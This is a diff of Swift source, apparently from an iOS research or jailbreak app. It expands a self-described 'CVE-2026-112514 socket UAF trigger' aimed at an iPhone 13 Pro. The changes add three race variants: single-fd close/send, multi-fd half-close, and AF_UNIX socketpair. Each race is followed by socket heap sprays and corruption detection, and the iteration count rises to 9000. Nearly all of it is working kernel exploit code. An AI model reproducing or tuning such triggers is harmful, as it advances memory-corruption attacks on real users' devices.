@@ -512,9 +512,10 @@ func runFuzzMode() async {
         log = ""
         try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
         emit("=== CVE-2026-112514 socket UAF trigger (13 Pro) ===")
+        signal(SIGPIPE, SIG_IGN)
         let ip = "127.0.0.1"
         let port = 8080
-        let iterations = 3000
+        let iterations = 9000
         // --- local loopback listener so connects reach ESTABLISHED ---
         let listenFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
         var laddr = sockaddr_in()
@@ -528,54 +529,146 @@ func runFuzzMode() async {
                 bind(listenFd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
             }
         }
-        listen(listenFd, 16)
+        listen(listenFd, 64)
+        let heldLock = NSLock()
+        var heldAccepted: [Int32] = []
         Thread.detachNewThread {
             while true {
                 let c = accept(listenFd, nil, nil)
                 if c >= 0 {
-                    var rb = [UInt8](repeating: 0, count: 4096)
-                    _ = recv(c, &rb, rb.count, 0)
+                    // Keep the most recent few connections unread (bounded), close older
+                    // ones. Leaving data unread keeps it queued in the socket buffers,
+                    // and the bound prevents an fd leak over long runs.
+                    heldLock.lock()
+                    if heldAccepted.count >= 8 { close(heldAccepted.removeFirst()) }
+                    heldAccepted.append(c)
+                    heldLock.unlock()
                 } else { break }
             }
         }
         var triggered = false
         var sendBuf = [UInt8](repeating: 0x41, count: 64)
+        var multiBuf = [UInt8](repeating: 0, count: 32)
 
         for it in 0..<iterations {
             if triggered { break }
-            let target = sockUafMakeSocket(ip, port)
-            if target < 0 { continue }
-            let box = SocketUafBox()
-            let closer = Thread {
-                while !box.stop {
-                    if box.trigger { close(target); break }
-                    usleep(1)
-                }
-            }
-            let sender = Thread {
-                while !box.stop {
-                    if box.trigger {
-                        _ = send(target, &sendBuf, sendBuf.count, MSG_DONTWAIT)
-                        _ = send(target, &sendBuf, sendBuf.count, MSG_DONTWAIT)
-                        shutdown(target, SHUT_RDWR)
+            if it % 3 == 0 {
+                // ---- variant A: single-fd close vs send (PoC run_race_iteration) ----
+                let target = sockUafMakeSocket(ip, port)
+                if target >= 0 {
+                    let box = SocketUafBox()
+                    let closer = Thread {
+                        while !box.stop {
+                            if box.trigger { close(target); break }
+                            usleep(1)
+                        }
                     }
-                    usleep(1)
+                    let sender = Thread {
+                        while !box.stop {
+                            if box.trigger {
+                                _ = send(target, &sendBuf, sendBuf.count, MSG_DONTWAIT)
+                                _ = send(target, &sendBuf, sendBuf.count, MSG_DONTWAIT)
+                                shutdown(target, SHUT_RDWR)
+                            }
+                            usleep(1)
+                        }
+                    }
+                    usleep(500)
+                    closer.start()
+                    sender.start()
+                    usleep(100)
+                    box.trigger = true
+                    usleep(10)
+                    let spray = sockUafSpray(256)
+                    usleep(100)
+                    if sockUafCheck(spray) {
+                        emit("[!] ITER \(it) single-fd: CORRUPTION DETECTED")
+                        triggered = true
+                    }
+                    box.stop = true
+                    usleep(200)
+                    for fd in spray { close(fd) }
+                }
+            } else if it % 3 == 1 {
+                // ---- variant B: 8-fd close-half / send-half (PoC run_multi_fd_race) ----
+                var fds: [Int32] = []
+                for _ in 0..<8 {
+                    let f = sockUafMakeSocket(ip, port)
+                    if f >= 0 { fds.append(f) }
+                }
+                if fds.count >= 4 {
+                    usleep(500)
+                    var i = 0
+                    while i < fds.count {
+                        _ = send(fds[i], &multiBuf, multiBuf.count, MSG_DONTWAIT)
+                        shutdown(fds[i], SHUT_RDWR)
+                        i += 2
+                    }
+                    i = 0
+                    while i < fds.count {
+                        close(fds[i]); fds[i] = -1
+                        i += 2
+                    }
+                    let spray = sockUafSpray(256)
+                    usleep(50)
+                    i = 1
+                    while i < fds.count {
+                        if fds[i] >= 0 { _ = send(fds[i], &multiBuf, multiBuf.count, MSG_DONTWAIT) }
+                        i += 2
+                    }
+                    if sockUafCheck(spray) {
+                        emit("[!] ITER \(it) multi-fd: CORRUPTION DETECTED")
+                        triggered = true
+                    }
+                    for fd in spray { close(fd) }
+                    for fd in fds { if fd >= 0 { close(fd) } }
+                } else {
+                    for fd in fds { close(fd) }
+                }
+            } else {
+                // ---- variant C: AF_UNIX socketpair close vs send (no listener needed) ----
+                var pair: [Int32] = [-1, -1]
+                let pr = pair.withUnsafeMutableBufferPointer { buf -> Int32 in
+                    socketpair(AF_UNIX, SOCK_STREAM, 0, buf.baseAddress)
+                }
+                if pr == 0 {
+                    let box = SocketUafBox()
+                    let closer = Thread {
+                        while !box.stop { if box.trigger { close(pair[0]); break }; usleep(1) }
+                    }
+                    let sender = Thread {
+                        while !box.stop {
+                            if box.trigger {
+                                _ = send(pair[0], &sendBuf, sendBuf.count, MSG_DONTWAIT)
+                                _ = send(pair[0], &sendBuf, sendBuf.count, MSG_DONTWAIT)
+                            }
+                            usleep(1)
+                        }
+                    }
+                    let reader = Thread {
+                        while !box.stop {
+                            var rb = [UInt8](repeating: 0, count: 64)
+                            _ = recv(pair[0], &rb, rb.count, MSG_DONTWAIT)
+                            usleep(1)
+                        }
+                    }
+                    usleep(200)
+                    closer.start(); sender.start(); reader.start()
+                    usleep(100)
+                    box.trigger = true
+                    usleep(20)
+                    let spray = sockUafSpray(256)
+                    usleep(200)
+                    if sockUafCheck(spray) {
+                        emit("[!] ITER \(it) socketpair: CORRUPTION DETECTED")
+                        triggered = true
+                    }
+                    box.stop = true
+                    usleep(300)
+                    for fd in spray { close(fd) }
+                    if pair[1] >= 0 { close(pair[1]) }
                 }
             }
-            closer.start()
-            sender.start()
-            usleep(200)
-            box.trigger = true
-            usleep(3000)
-            let spray = sockUafSpray(256)
-            usleep(300)
-            if sockUafCheck(spray) {
-                emit("[!] ITER \(it): CORRUPTION DETECTED — UAF triggered")
-                triggered = true
-            }
-            box.stop = true
-            usleep(2000)
-            for fd in spray { close(fd) }
             if triggered { break }
             if it % 100 == 0 { emit("[*] iter \(it)/\(iterations)") }
         }
